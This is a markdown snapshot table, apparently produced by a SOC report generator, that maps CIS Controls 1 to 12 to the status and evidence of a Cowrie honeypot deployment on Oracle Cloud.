## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-04T08:40:44Z_
